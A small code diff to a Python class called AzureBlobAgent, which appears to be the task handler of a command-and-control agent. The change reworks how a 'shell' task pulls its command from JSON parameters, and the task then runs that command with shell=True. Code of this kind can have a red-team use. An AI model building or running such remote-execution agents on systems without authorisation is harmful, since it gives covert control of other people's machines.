@@ -161,8 +161,6 @@ class AzureBlobAgent:
         """Execute a task and return response"""
         task_id = task.get("id", str(uuid_lib.uuid4()))
         command = task.get("command", "")
-        parameters = task.get("parameters", "")
-
         print(f"[*] Executing task {task_id}: {command}")
 
         response = {
@@ -174,10 +172,12 @@ class AzureBlobAgent:
 
         try:
             if command == "shell":
+                shell_params = json.loads(task.get("parameters", "{}"))
+                shell_params = shell_params.get("command", "")
                 # Execute shell command
                 import subprocess
                 result = subprocess.run(
-                    parameters,
+                    shell_params,
                     shell=True,
                     capture_output=True,
                     text=True,
